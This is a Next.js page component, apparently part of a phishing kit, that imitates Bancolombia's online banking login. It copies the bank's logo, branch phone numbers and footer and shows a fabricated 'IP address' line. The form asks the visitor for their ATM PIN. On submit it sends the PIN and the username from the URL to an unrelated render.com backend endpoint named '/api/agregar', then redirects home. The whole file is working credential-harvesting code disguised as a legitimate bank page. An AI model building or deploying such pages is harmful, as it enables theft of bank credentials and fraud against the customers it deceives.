'use client';

import Image from 'next/image';
import Link from 'next/link';
import { useState, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';  
import { Open_Sans } from 'next/font/google';
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Lock as LockIcon, Info as InfoIcon } from "lucide-react";

const openSans = Open_Sans({ subsets: ['latin'] });

function ClaveContent() {
  const [currentDateTime, setCurrentDateTime] = useState('');
  const [clave, setClave] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();  
  const usuario = searchParams.get('usuario'); 
  const url = 'https://backendproyecto-btur.onrender.com';

  useEffect(() => {
    setCurrentDateTime(new Date().toLocaleString());
    const timer = setInterval(() => {
      setCurrentDateTime(new Date().toLocaleString());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const [password, setPassword] = useState('');

  const handleChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    setClave(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!clave) {
      alert('Por favor ingresa la clave');
      return;
    }

    try {
      const response = await fetch(`${url}/api/agregar`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ usuario, clave }), 
        
      });

      if (response.ok) {
        router.push('/');
      } else {
        const errorData = await response.json();
        alert(`Error: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
      alert('Hubo un problema al enviar los datos');
    }
  };

  return (
    <div className={`min-h-screen flex flex-col bg-white ${openSans.className}`}>
      <header className="bg-background p-4 border-b border-border">
        <div className="max-w-7xl mx-auto">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/bancolombia-logo-5oInibfRwiiIdn8tSNawti11zRcDMj.png"
            alt="Bancolombia Logo"
            width={170}
            height={27}
            className="h-[27px] w-auto"
          />
          <p className="text-[1.08rem] text-muted-foreground mt-1">Sucursal Virtual Personas</p>
          <p className="text-xs text-muted-foreground mt-1">Fecha y hora actual: {currentDateTime}</p>
        </div>
      </header>

      <main className="flex-grow flex items-start justify-center px-4 sm:px-6 lg:px-8 pt-8">
        <div className="max-w-4xl w-full space-y-8">
          <div className="text-left bg-black py-[1.824px] px-3.2">
            <h1 className="text-lg font-semibold text-white pl-[15px]">Inicio de sesión</h1>
          </div>
          <div className="flex flex-col md:flex-row md:space-x-8 space-y-8 md:space-y-0">
            <div className="w-full max-w-md">
              <Card>
                <CardHeader className="bg-black text-white py-[0.85em]">
                  <CardTitle className="text-[1.03em]">Clave</CardTitle>
                </CardHeader>
                <CardContent className="pt-6">
                  <form className="space-y-6" onSubmit={handleSubmit}>
                    <div>
                      <label htmlFor="clave" className="flex items-center text-sm font-medium mb-1">
                        Ingresa tu clave
                      </label>
                      <div className="relative mt-1">
                        <Input
                          id="clave"
                          type="password"
                          value={clave}
                          onChange={handleChange}
                          className="pl-10 rounded-none"
                        />
                        <LockIcon className="w-4 h-4 absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground" aria-hidden="true" />
                      </div>
                      <p className="text-xs text-muted-foreground mt-1">
                        Ingresa mediante el teclado la clave que usas en el cajero automático
                      </p>
                    </div>
                    <div className="flex justify-center space-x-4 pt-4">
                      <Button variant="outline" className="rounded-none border-black">
                        <Link href="/">Cancelar</Link>
                      </Button>
                      <Button type="submit" className="bg-yellow-400 text-black hover:bg-yellow-500 rounded-none">
                        Ingresar
                      </Button>
                    </div>
                  </form>
                  <div className="flex justify-end items-center pt-2">
                    <InfoIcon className="w-3 h-3 mr-1 text-muted-foreground" aria-hidden="true" />
                    <Link href="#" className="text-sm text-muted-foreground hover:underline">
                      Genera una clave personal
                    </Link>
                  </div>
                </CardContent>
              </Card>
              <Card className="mt-8">
                <CardContent className="p-0">
                  <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/iconos-2-sip0ndFTnPrd0UQjqNTsKAFfKTq09O.jpg"
                    alt="Información adicional sobre servicios bancarios"
                    width={360}
                    height={180}
                    layout="responsive"
                  />
                </CardContent>
              </Card>
            </div>
            <div className="w-full max-w-md">
              <div className="w-full relative aspect-[16/9]">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/12110e566a318__cuentas-A0KhC12s0G4efxmnoj4ZnynqqPPeIC.png"
                  alt="Dos personas sonrientes mirando una pantalla"
                  layout="fill"
                  objectFit="cover"
                  className="rounded-lg"
                />
              </div>
              <p className="text-sm text-center text-muted-foreground">
                ¿No conoces la Sucursal Virtual Personas de Bancolombia? Conoce más{" "}
                <Link href="#" className="text-blue-600 hover:underline">
                  aquí
                </Link>
              </p>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-background p-4 text-center text-xs text-muted-foreground border-t border-border" role="contentinfo">
        <p>
          Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2
          554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
        </p>
        <p>Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14</p>
        <p>Dirección IP: 181.143.198.86</p>
        <p>Copyright ©️ 2024 Bancolombia S.A.</p>
      </footer>
    </div>
  );
}

export default function ClavePage() {
  return (
    <Suspense fallback={<div>Cargando...</div>}>
      <ClaveContent />
    </Suspense>
  );
}
